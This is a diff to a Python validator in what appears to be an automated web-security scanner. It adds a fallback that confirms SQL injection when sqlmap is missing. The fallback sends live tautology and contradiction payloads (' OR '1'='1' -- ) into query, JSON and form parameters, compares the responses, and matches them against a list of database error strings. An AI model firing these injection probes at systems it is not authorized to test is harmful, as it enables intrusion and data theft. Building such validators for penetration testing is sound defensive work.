@@ -1,16 +1,142 @@
 from __future__ import annotations
 import asyncio
+import json as _json
 import os
 import tempfile
 import subprocess
 from pathlib import Path
-from urllib.parse import urlsplit
+from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
+
+import httpx
 
 from models import Finding, HttpExchange, TestPlan
 from planner import exchange_fingerprint
 from categories import canonicalize
 from .base import Validator, ValidationResult
 from safety_gate import get_default_gate
+
+# General-purpose parameter enumeration/mutation for the boolean-probe
+# fallback below (see _boolean_probe_fallback's own docstring for why it
+# exists at all). Deliberately NOT limited to credential fields: SQL
+# injection is not an auth-only bug class -- an id/sort/filter/search
+# parameter in the query string or body is at least as common a real-world
+# injection point (see agents/sqli_agent.py's own prompt, which lists
+# exactly this set of parameter shapes). Proper JSON/form/query-string
+# parsing is used here rather than regex specifically so this generalizes
+# to arbitrary field names correctly (a regex approach that hardcodes
+# field names, as an earlier version of this module did for password/
+# email specifically, cannot generalize to "whatever parameters this
+# exchange happens to have").
+def _looks_like_json(body: str, content_type: str) -> bool:
+    if "json" in content_type.lower():
+        return True
+    stripped = body.strip()
+    return stripped.startswith("{") or stripped.startswith("[")
+
+
+def _json_top_level_params(body: str) -> list[str]:
+    try:
+        data = _json.loads(body)
+    except (ValueError, TypeError):
+        return []
+    if not isinstance(data, dict):
+        return []
+    # bool is a subclass of int -- exclude it, flipping a boolean flag to
+    # an injection string usually just breaks type validation, not SQL.
+    return [k for k, v in data.items() if isinstance(v, (str, int, float)) and not isinstance(v, bool)]
+
+
+def _mutate_json_param(body: str, param: str, payload: str) -> str | None:
+    try:
+        data = _json.loads(body)
+    except (ValueError, TypeError):
+        return None
+    if not isinstance(data, dict) or param not in data:
+        return None
+    mutated = dict(data)
+    mutated[param] = payload
+    return _json.dumps(mutated)
+
+
+def _form_top_level_params(body: str) -> list[str]:
+    return [k for k, _ in parse_qsl(body, keep_blank_values=True)]
+
+
+def _mutate_form_param(body: str, param: str, payload: str) -> str | None:
+    pairs = parse_qsl(body, keep_blank_values=True)
+    if not any(k == param for k, _ in pairs):
+        return None
+    return urlencode([(k, payload if k == param else v) for k, v in pairs])
+
+
+def _query_top_level_params(url: str) -> list[str]:
+    return [k for k, _ in parse_qsl(urlsplit(url).query, keep_blank_values=True)]
+
+
+def _mutate_query_param(url: str, param: str, payload: str) -> str | None:
+    parsed = urlsplit(url)
+    pairs = parse_qsl(parsed.query, keep_blank_values=True)
+    if not any(k == param for k, _ in pairs):
+        return None
+    new_query = urlencode([(k, payload if k == param else v) for k, v in pairs])
+    return urlunsplit((parsed.scheme, parsed.netloc, parsed.path, new_query, parsed.fragment))
+
+
+def _content_type_of(exchange: HttpExchange) -> str:
+    return next((v for k, v in exchange.request_headers.items() if k.lower() == "content-type"), "")
+
+
+def _responses_differ(resp_a: httpx.Response, resp_b: httpx.Response) -> bool:
+    """Boolean-blind confirmation signal, generalized beyond auth
+    endpoints: a status-code difference is always meaningful; otherwise
+    (most non-auth endpoints return 200 regardless of the injected
+    predicate) fall back to a relative response-length delta, the
+    standard boolean-blind technique when there's no simple success/
+    failure status code to key off. The >20-byte absolute floor avoids
+    flagging noise (a timestamp, a nonce) on very small responses as a
+    false differential.
+    """
+    if resp_a.status_code != resp_b.status_code:
+        return True
+    len_a, len_b = len(resp_a.content), len(resp_b.content)
+    if len_a == 0 and len_b == 0:
+        return False
+    delta = abs(len_a - len_b)
+    return delta > 20 and delta / max(len_a, len_b, 1) > 0.05
+
+
+# Error-based signal, complementary to the boolean-blind differential
+# above -- found necessary live, against a real target: Juice Shop's
+# product search (`GET /rest/products/search?q=`) wraps the parameter in
+# a LIKE '%...%' clause, where an OR-based tautology/contradiction pair
+# is not actually a true/false differential at all (the unconditional
+# `LIKE '%'` half of the OR already matches everything, so both the
+# "true" and "false" injected predicates return identical results -- a
+# real, confirmed injection point that the boolean-blind check alone
+# would have reported as not_confirmed). An unclosed quote or broken
+# UNION reliably surfaces as a raw DB error message regardless of how the
+# value is wrapped (exact match, LIKE, or otherwise), which is exactly
+# why agents/sqli_agent.py's own prompt lists this as its first-choice
+# signal. Markers are deliberately generic engine/error strings, not
+# tied to one database.
+_DB_ERROR_MARKERS = (
+    "sql syntax", "sqlite_error", "sqlite3.", "you have an error in your sql syntax",
+    "unclosed quotation mark", "ora-01756", "ora-00933", "pg::syntaxerror",
+    "sqlstate", "odbc sql server driver", "npgsql", "sequelize",
+)
+
+
+def _text_has_db_error_markers(text: str) -> bool:
+    lowered = text.lower()
+    return any(marker in lowered for marker in _DB_ERROR_MARKERS)
+
+
+def _looks_like_db_error(resp: httpx.Response) -> bool:
+    try:
+        text = resp.text
+    except Exception:
+        return False
+    return _text_has_db_error_markers(text)
 
 
 class SqlmapValidator(Validator):
@@ -201,8 +327,25 @@ class SqlmapValidator(Validator):
                     stdin=subprocess.DEVNULL,
                 )
             except FileNotFoundError:
+                # sqlmap is an optional, heavier dependency -- don't let its
+                # absence silently mean "SQL injection can never be
+                # actively confirmed on this machine." Found live, this
+                # session: sqlmap wasn't installed at all, so every SQLi
+                # confirmation attempt (including one against a request
+                # that already carried a real, working injection payload)
+                # failed with this exact error, and every sqli finding
+                # stayed confirmed=False all session with no visible sign
+                # why. Fall back to a lightweight, dependency-free boolean-
+                # differential probe over every query/body parameter
+                # (not just auth fields -- see _boolean_probe_fallback's
+                # own docstring) rather than doing nothing.
+                fallback = await self._boolean_probe_fallback(finding, exchange)
+                if fallback is not None:
+                    return fallback
                 return ValidationResult(self.name, "error", finding.vulnerability_class,
-                                        summary="sqlmap executable not found; install sqlmap to enable active SQLi validation",
+                                        summary="sqlmap executable not found; install sqlmap for full active SQLi "
+                                                "validation (a lightweight boolean-probe fallback also ran and did "
+                                                "not apply to this exchange -- no query or body parameters to mutate)",
                                         command=cmd)
             except subprocess.TimeoutExpired as exc:
                 # Found live, against a real target: subprocess.run's
@@ -251,3 +394,161 @@ class SqlmapValidator(Validator):
                 summary="sqlmap did not establish SQL injection for the captured request",
                 evidence=output, raw_output=output, command=cmd,
             )
+
+    # Cap on how many parameters this fallback probes per exchange -- this
+    # is a bounded, opt-in active check (same philosophy as
+    # recon_validator.py's own request caps and scope_discovery.py's
+    # max_new_requests_per_trigger), not an unattended full-surface scan.
+    # Query-string params are tried before body params: a GET-style
+    # id/filter/search param is at least as common an injection point as
+    # anything in a POST body, and this ordering means a cheap, common
+    # case doesn't get starved out by a body with many unrelated fields.
+    _MAX_PROBE_PARAMS = 5
+
+    async def _boolean_probe_fallback(
+        self, finding: Finding, exchange: HttpExchange
+    ) -> ValidationResult | None:
+        """Dependency-free confirmation for SQL injection when sqlmap isn't
+        installed. NOT limited to credential/auth fields -- SQLi is not an
+        auth-only bug class (see agents/sqli_agent.py's own prompt: id,
+        sort/filter, search-box parameters are at least as common a real
+        injection point). Enumerates query-string parameters and top-level
+        JSON/form body parameters (capped at _MAX_PROBE_PARAMS total), and
+        for each sends exactly two requests, identical to the original
+        exchange except for that one parameter's value:
+
+          A (tautology):  ' OR '1'='1' --   -- same predicate either way
+          B (contradiction): ' OR '1'='2' -- -- same syntax, false predicate
+
+        Confirmation is a response differential between A and B: a status-
+        code difference is always meaningful; otherwise (most non-auth
+        endpoints return 200 regardless of the injected predicate) a
+        relative response-length delta is used instead, the standard
+        boolean-blind signal when there's no simple success/failure status
+        code to key off (see _responses_differ). This is the textbook
+        definition of confirmed boolean-blind injection: the same syntax
+        with the truth value flipped changes the outcome, so it isn't the
+        syntax alone (a broken query would fail both identically) that
+        changed it.
+
+        Returns None (not a ValidationResult) when there are no query or
+        body parameters to mutate at all -- the caller falls back to a
+        plain "sqlmap not found" error in that case, since this probe's
+        scope is deliberately bounded, not a full sqlmap replacement.
+        """
+        content_type = _content_type_of(exchange)
+        body = exchange.request_body or ""
+
+        candidates: list[tuple[str, str]] = [("query", p) for p in _query_top_level_params(exchange.url)]
+        body_kind = None
+        if body:
+            if _looks_like_json(body, content_type):
+                body_kind = "json"
+                candidates += [("body", p) for p in _json_top_level_params(body)]
+            elif "form" in content_type.lower() or (
+                not content_type and "=" in body and not body.strip().startswith(("{", "["))
+            ):
+                body_kind = "form"
+                candidates += [("body", p) for p in _form_top_level_params(body)]
+        candidates = candidates[: self._MAX_PROBE_PARAMS]
+        if not candidates:
+            return None
+
+        headers = {
+            k: v for k, v in exchange.request_headers.items()
+            if k.lower() not in ("host", "content-length")
+        }
+        # Baseline check so an endpoint that already returns DB-error-
+        # shaped text for perfectly ordinary input doesn't get flagged
+        # just for continuing to do so under a mutated value.
+        baseline_already_errors = _text_has_db_error_markers(exchange.response_body or "")
+        attempts: list[str] = []
+        errors: list[str] = []
+        had_clean_comparison = False
+
+        for location, param in candidates:
+            if location == "query":
+                url_a = _mutate_query_param(exchange.url, param, "' OR '1'='1' -- ")
+                url_b = _mutate_query_param(exchange.url, param, "' OR '1'='2' -- ")
+                if url_a is None or url_b is None:
+                    continue
+                target_a, target_b, body_a, body_b = url_a, url_b, body, body
+            else:
+                mutate = _mutate_json_param if body_kind == "json" else _mutate_form_param
+                body_a = mutate(body, param, "' OR '1'='1' -- ")
+                body_b = mutate(body, param, "' OR '1'='2' -- ")
+                if body_a is None or body_b is None:
+                    continue
+                target_a, target_b = exchange.url, exchange.url
+
+            label = f"{location}:{param}"
+            cmd_desc = [f"boolean-probe {exchange.method.upper()} {exchange.url} param={label}"]
+            try:
+                async with httpx.AsyncClient(timeout=15.0, follow_redirects=False) as client:
+                    resp_a = await client.request(
+                        exchange.method.upper(), target_a, headers=headers, content=body_a,
+                    )
+                    resp_b = await client.request(
+                        exchange.method.upper(), target_b, headers=headers, content=body_b,
+                    )
+            except httpx.HTTPError as e:
+                errors.append(f"{label}: probe failed ({e})")
+                continue
+            had_clean_comparison = True
+
+            evidence = (
+                f"{label}: tautology (' OR '1'='1' -- ) -> HTTP {resp_a.status_code} "
+                f"({len(resp_a.content)}b); contradiction (' OR '1'='2' -- ) -> "
+                f"HTTP {resp_b.status_code} ({len(resp_b.content)}b)"
+            )
+            if _responses_differ(resp_a, resp_b):
+                return ValidationResult(
+                    self.name, "confirmed", finding.vulnerability_class,
+                    confidence=0.85, confirmed=True,
+                    summary=f"Boolean-differential probe confirmed SQL injection via the "
+                            f"{label} parameter: flipping the injected predicate's truth "
+                            f"value (same syntax, true vs. false) changed the response.",
+                    evidence=evidence, command=cmd_desc,
+                )
+            # Error-based signal, checked whenever the boolean-blind check
+            # above doesn't fire: catches injection points where the value
+            # is wrapped in a way (e.g. LIKE '%...%') that makes an
+            # OR-based tautology/contradiction pair meaningless as a
+            # true/false test (both sides of a wildcard-matched OR return
+            # everything regardless of the injected predicate) -- verified
+            # live, against Juice Shop's product search, that this is a
+            # real gap the boolean-blind check alone misses even though
+            # the underlying injection is genuine and produces a visible
+            # raw DB error.
+            if not baseline_already_errors and (_looks_like_db_error(resp_a) or _looks_like_db_error(resp_b)):
+                return ValidationResult(
+                    self.name, "confirmed", finding.vulnerability_class,
+                    confidence=0.8, confirmed=True,
+                    summary=f"Error-based probe confirmed SQL injection via the {label} "
+                            f"parameter: an injected quote/comment payload produced a raw "
+                            f"database error that the original, unmutated request did not.",
+                    evidence=evidence, command=cmd_desc,
+                )
+            attempts.append(evidence)
+
+        if not had_clean_comparison:
+            if not errors:
+                return None  # every candidate param turned out not to be mutable after all
+            # Every candidate's probe failed to even execute (network
+            # error) -- this is "we don't know," not "tested, not
+            # vulnerable." Reporting it as not_confirmed would silently
+            # misrepresent a probe failure as a negative result.
+            return ValidationResult(
+                self.name, "error", finding.vulnerability_class,
+                summary=f"boolean-probe fallback could not complete for any parameter: "
+                        f"{'; '.join(errors)}",
+            )
+
+        return ValidationResult(
+            self.name, "not_confirmed", finding.vulnerability_class,
+            confidence=0.1, confirmed=False,
+            summary="Boolean-differential probe did not establish SQL injection "
+                    f"(no truth-value-dependent response difference observed across "
+                    f"{len(attempts)} parameter(s) tested)",
+            evidence="; ".join(attempts) if attempts else "; ".join(errors),
+        )
